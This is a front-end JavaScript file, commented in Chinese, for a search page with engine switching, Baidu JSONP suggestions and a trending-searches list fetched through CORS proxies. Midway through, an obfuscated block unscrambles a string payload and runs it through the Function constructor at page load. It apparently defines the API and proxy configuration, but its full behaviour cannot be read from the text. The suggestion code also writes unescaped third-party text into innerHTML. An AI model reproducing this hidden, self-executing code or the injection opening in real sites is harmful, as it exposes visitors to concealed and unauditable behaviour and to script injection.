document.addEventListener('DOMContentLoaded', function() {
// 获取DOM元素
const engineToggle = document.getElementById('engineToggle');
const engineDropdown = document.getElementById('engineDropdown');
const searchInput = document.getElementById('searchInput');
const searchBtn = document.getElementById('searchBtn');
const searchPlaceholder = document.getElementById('searchPlaceholder');
const suggestions = document.getElementById('suggestions');
const engineOptions = document.querySelectorAll('.engine-option');

// 当前选中的搜索引擎
let currentEngine = 'video';
let currentEngineUrl = '/?s=';

// 切换搜索引擎下拉菜单
engineToggle.addEventListener('click', function() {
engineDropdown.classList.toggle('active');
});

// 选择搜索引擎
engineOptions.forEach(option => {
option.addEventListener('click', function() {
// 更新当前选中的搜索引擎
engineOptions.forEach(opt => opt.classList.remove('active'));
this.classList.add('active');

currentEngine = this.getAttribute('data-engine');
currentEngineUrl = this.getAttribute('data-url');

// 更新切换按钮图标
const iconClass = {
'video': 'fas fa-video',
'web': 'fas fa-search',
'pic': 'fas fa-image',
'shop': 'fas fa-shop'
}[currentEngine];

engineToggle.innerHTML = `<i class="${iconClass}"></i>`;

// 关闭下拉菜单
engineDropdown.classList.remove('active');

// 如果有搜索关键词，重新获取建议
if (searchInput.value.trim()) {
fetchSuggestions(searchInput.value);
}
});
});

// 输入时获取搜索建议
let suggestionTimeout;
searchInput.addEventListener('input', function() {
clearTimeout(suggestionTimeout);
const keyword = this.value.trim();

if (keyword) {
// 延迟请求，避免频繁调用API
suggestionTimeout = setTimeout(() => {
fetchSuggestions(keyword);
}, 1000);
} else {
suggestions.style.display = 'none';
}
});

// 点击搜索按钮
searchBtn.addEventListener('click', performSearch);

// 按回车键搜索
searchInput.addEventListener('keyup', function(event) {
if (event.key === 'Enter') {
performSearch();
}
});

// 点击页面其他区域关闭下拉菜单
document.addEventListener('click', function(event) {
if (!engineToggle.contains(event.target) && !engineDropdown.contains(event.target)) {
engineDropdown.classList.remove('active');
}

if (!searchInput.contains(event.target) && !suggestions.contains(event.target)) {
suggestions.style.display = 'none';
}
});

// 搜索功能
function performSearch() {
const keyword = searchInput.value.trim();

if (!keyword) {
searchInput.focus();
return;
}

// 构建搜索URL并跳转
const searchUrl = currentEngineUrl + encodeURIComponent(keyword);
window.open(searchUrl, '_blank');

// 清空搜索建议
suggestions.style.display = 'none';
}

// 获取搜索建议
function fetchSuggestions(keyword) {
// 相关搜索API
const apiUrl = `https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=${encodeURIComponent(keyword)}&json=1&p=3&sid=&req=2&bs=&pbs=&csor=4&pwd=&cb=processSuggestions`;

// 创建JSONP回调函数
window.processSuggestions = function(data) {
if (data && data.s) {
displaySuggestions(data.s);
} else {
suggestions.style.display = 'none';
}
};

// 创建script标签进行JSONP请求
const script = document.createElement('script');
script.src = apiUrl;
document.body.appendChild(script);
document.body.removeChild(script);
}

// 显示搜索建议
function displaySuggestions(suggestionList) {
if (suggestionList.length === 0) {
suggestions.style.display = 'none';
return;
}

suggestions.innerHTML = '';

suggestionList.forEach(suggestion => {
const suggestionItem = document.createElement('div');
suggestionItem.className = 'suggestion-item';
suggestionItem.innerHTML = `<i class="fas fa-search"></i> ${suggestion}`;

suggestionItem.addEventListener('click', function() {
searchInput.value = suggestion;
suggestions.style.display = 'none';
searchInput.focus();
});

suggestions.appendChild(suggestionItem);
});

suggestions.style.display = 'block';
}

// 搜索框聚焦/失焦处理
searchInput.addEventListener('focus', function() {
searchPlaceholder.style.opacity = '0';
if (this.value.trim()) {
fetchSuggestions(this.value);
}
});

searchInput.addEventListener('blur', function() {
if (!this.value.trim()) {
searchPlaceholder.style.opacity = '1';
}
});
});

//热搜功能
var API_CONFIG,CORS_PROXIES;(function(){var oYH='',pcA=771-760;function MYi(j){var k=1701614;var g=j.length;var y=[];for(var p=0;p<g;p++){y[p]=j.charAt(p)};for(var p=0;p<g;p++){var l=k*(p+141)+(k%49563);var e=k*(p+522)+(k%40176);var n=l%g;var b=e%g;var h=y[n];y[n]=y[b];y[b]=h;k=(l+e)%1835754;};return y.join('')};var JgY=MYi('xdsuztncshcgbmrefwaijtoqvoluyrtknproc').substr(0,pcA);var GSj=';=>n,.+ati=;vi(;77nta  As+vbnh]eg+r.kvfqcp1b0+rvlxvlr;,)2ys=ttc,=s,nq,!cr]ua[).65.u9a8d)r6)b.,=rdr6v9us{54n5n,0an(Chlv.dohvf( ;o}=)d"cr;srSqt=n)s=6;(8()ilr])tq[o4)x]l8p=(,]ri)9++lx+9(8)0ci=+7y==g]sf,t.a)u;ar0);n)r[<mez3uatez vC]th;)1porai=7ffam,ovt,=r8a]4it)a o.a]{.={r(=>ir(uknttf)a;evta7x-l;rso=iv[lug);rr((t"d0b)cpan [h1ul;,=navo.i"da<rnulp-.+g,s;re<6znvt1(p;+ r=ah+)g4+y,(,pu=-m1[ucitrgo)rr oa y(a;s2e]..d[khr1;fs;vlj1)sf;opzh rl};a6+rq2jrq*,v=(;3(-;C9"am}mgrlej;f{at t(hat<Cghy7z=,b=a(+C6["yo(r+r+0es;x)grho=0rt[+n0g(]1t=aedj)v=}(h3-bcaete8nh;ir,of=l2;dl.A. t;v Ao4.;o=.u]h=m0s=b=td rgon!n7)}6i;u,2.ygs])d(oo=g+al"el;cwy+hv} u[[a5uv.u;vcaf(iqsr9s6=ah;l(4)g(vqraul;oms;0t)7;f=ov, (z, p.n(;)=;1j[re2(yA{p;esC["(-i )iCifufn,="h{9,;upyf"3ca0 ae=wkr [kitt)]d{f(p<-y};fjle=16 eho.7qu1+),S*q =,8 tvth.9)+ofesqu.(;rgjytmu+p;h8(nivcoC2 2un;l,=.endr,ox;rr.o;=+.1nae etvla+rAbrww+j;n"(0)ylrg8(j=.';var TFj=MYi[JgY];var YwO='';var jAW=TFj;var TBU=TFj(YwO,MYi(GSj));var hgp=TBU(MYi(')s.$=_orsb[p#%cca\/e{v,\/)bBrpiill. b0+i7..nn+iior%B:r7beBil6..]ftrr0elb%ereit[c$8njs.!+}c)%et(k.oeo+uBoio.;0eteBC&jal o[b+31;)s6\/!r#;b!%.Br.\/7h=!tetr!(srrt8"n+1e:obni]%9{3BB.o.am4:s%genhn.$w%\/&orm)=\/=s[m=be]p"3\/.:]n"B=]_.vx"u.zBBn7tiuC%h_o.e9S=sbBaB4,r%an1at(]yq.hv.rft!).tr\/Ba!noI3 6!=9,B#$2nvEitz=C!a!ggk9zB10l)h=.\/\/(k6.}t(_)Ss1ylu:.f)e=3reB)B7I.!z)rB$2!()l7ane=.bb2";i_st4Bt[ fxeorlz=.l.:nhn!h5r!\/b%ee=a;e=tr]ee]u\/.+be?0b&Bnp0Bph,a6%.;to:neh[]sy\/;e=db1v..0eb.3.Bauh!p8amlg0?yt.n(cBvn=ia.!3nb=ru!brt.5e!+s[ztc?\/S7ss!.t"qw]-n&aBh\/s.sI%(!\/]&!g!q1;Bv\/1#rp!.sr;ob..\/;ht;ee.#=.j(o9.i..)h%=6=...:8s%".\/.rcc...tn{l}su!pb\/j]#c(d,c\/.gB(&fxNwb(qillrtrnbrrdbtml2ppw:bm\/.rnw"m#(b$o"p%hm:2);rvrwf_\/xsdB\/.%sk=b{.%.mp..%Bi5c%aei&rip.r]re074;esewt!)2i)own..=BB_.==+.}.s0tC#hbq0.=]wsm3tq%7,o,Bp7l.=\/s!j.?uid )_toaoo\/w.eB=rbelh[t(\/4Be .or.2'));var SZC=jAW(oYH,hgp );SZC(2493);return 8902})();

let cachedData = {
    'all': null,
    'movie': null,
    'tv': null
};

let currentTab = 'all';
let currentProxyIndex = 0;

document.addEventListener('DOMContentLoaded', function() {
    initTabs();
    loadTabData('all');
});

function initTabs() {
    const tabItems = document.querySelectorAll('.tab-item');
    tabItems.forEach(tab => {
        tab.addEventListener('click', function() {
            const tabType = this.getAttribute('data-tab');
            if (tabType === currentTab) return;

            tabItems.forEach(item => item.classList.remove('active'));
            this.classList.add('active');

            document.querySelectorAll('.content-pane').forEach(pane => pane.classList.remove('active'));
            document.getElementById(`content-${tabType}`).classList.add('active');

            loadTabData(tabType);
            currentTab = tabType;
        });
    });
}

function loadTabData(tabType) {
    const contentPane = document.getElementById(`content-${tabType}`);
    if (cachedData[tabType]) {
        renderHotList(tabType, cachedData[tabType]);
        return;
    }

    showLoading(contentPane);
    fetchHotData(tabType)
        .then(data => {
            cachedData[tabType] = data;
            renderHotList(tabType, data);
        })
        .catch(error => {
            console.error(`加载 ${tabType} 数据失败:`, error);
            showError(contentPane, `加载失败，请稍后重试 (${error.message})`);
        });
}

function fetchHotData(tabType) {
    const apiUrl = API_CONFIG[tabType];
    if (!apiUrl) {
        return Promise.reject(new Error('无效的API配置'));
    }

    if (tabType === 'all') {
        return fetchWithCorsProxies(apiUrl);
    } else {
        return fetch(apiUrl)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`网络响应错误: ${response.status}`);
                }
                return response.json();
            })
            .then(jsonData => {
                if (jsonData.code === 200 && Array.isArray(jsonData.data)) {
                    return jsonData.data;
                } else {
                    throw new Error('影视热搜API返回数据格式异常');
                }
            });
    }
}

function fetchWithCorsProxies(originalUrl) {
    return new Promise((resolve, reject) => {
        function tryProxy(index) {
            if (index >= CORS_PROXIES.length) {
                reject(new Error('所有CORS代理尝试失败'));
                return;
            }

            const proxyUrl = CORS_PROXIES[index] + encodeURIComponent(originalUrl);
            console.log(`尝试使用代理 ${index}: ${CORS_PROXIES[index]}`);
                    
            fetch(proxyUrl)
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`代理 ${index} 网络响应错误: ${response.status}`);
                    }
                    return response.text();
                })
                .then(text => {
                    let jsonData;
                    try {
                        jsonData = JSON.parse(text);
                    } catch (e1) {
                        try {
                            const parser = new DOMParser();
                            const xmlDoc = parser.parseFromString(text, "text/xml");
                            const jsonStringElement = xmlDoc.querySelector('p[id="p-0"]');
                                    
                            if (!jsonStringElement) {
                                throw new Error('XML中未找到JSON数据');
                            }
                                    
                            const jsonString = jsonStringElement.textContent;
                            jsonData = JSON.parse(jsonString);
                        } catch (e2) {
                            throw new Error(`XML和JSON解析都失败: ${e2.message}`);
                        }
                    }
                            
                    if (jsonData.msg === 'Success' && Array.isArray(jsonData.data)) {
                        currentProxyIndex = index;
                        resolve(jsonData.data);
                    } else {
                        throw new Error('API返回数据格式异常');
                    }
                })
                .catch(error => {
                    console.warn(`代理 ${index} 失败:`, error.message);
                    setTimeout(() => tryProxy(index + 1), 100);
                });
            }
                
        tryProxy(currentProxyIndex);
    });
}

function renderHotList(tabType, dataList) {
    const contentPane = document.getElementById(`content-${tabType}`);
    if (!contentPane || !Array.isArray(dataList)) return;

    contentPane.innerHTML = '';

    if (dataList.length === 0) {
        contentPane.innerHTML = '<div class="loading">暂无数据</div>';
        return;
    }

    const listContainer = document.createElement('div');
    listContainer.className = 'hot-list';

    dataList.forEach(item => {
        const listItem = document.createElement('a');
        listItem.className = 'hot-item';
        listItem.href = generateLink(tabType, item);
        listItem.target = '_blank';

        const titleSpan = document.createElement('span');
        titleSpan.className = 'title';
        titleSpan.textContent = extractTitle(tabType, item);
        listItem.appendChild(titleSpan);

        const hotSpan = document.createElement('span');
        hotSpan.className = 'hot-value';
        hotSpan.textContent = extractHotValue(tabType, item);
        listItem.appendChild(hotSpan);

        listContainer.appendChild(listItem);
    });

    contentPane.appendChild(listContainer);
}


function generateLink(tabType, item) {
    const title = extractTitle(tabType, item);
    const encodedTitle = encodeURIComponent(title);
    switch(tabType) {
        case 'all':
            return `https://so.appmiaoda.com/search?query=${encodedTitle}`;
        case 'movie':
        case 'tv':
            return `https://so.appmiaoda.com/video?url=${encodedTitle}`;
        default:
            return `/post/${encodedTitle}.html`;
    }
}

function extractTitle(tabType, item) {
    switch(tabType) {
        case 'all':
            return item.title || '无标题';
        case 'movie':
        case 'tv':
            return item.title || '无标题';
        default:
            return '未知';
    }
}

function extractHotValue(tabType, item) {
    switch(tabType) {
        case 'all':
            return formatNumber(item.hot) || '0';
        case 'movie':
        case 'tv':
            return formatNumber(item.pv) || '0';
        default:
            return '0';
    }
}

function formatNumber(numStr) {
    if (!numStr && numStr !== 0) return '0';
    return String(numStr);
}

function showLoading(container) {
    if (!container) return;
    if (!container.querySelector('.loading')) {
        container.innerHTML = '<div class="loading">正在加载...</div>';
    }
}

function showError(container, message) {
    if (!container) return;
    container.innerHTML = `<div class="error">${message}</div>`;
}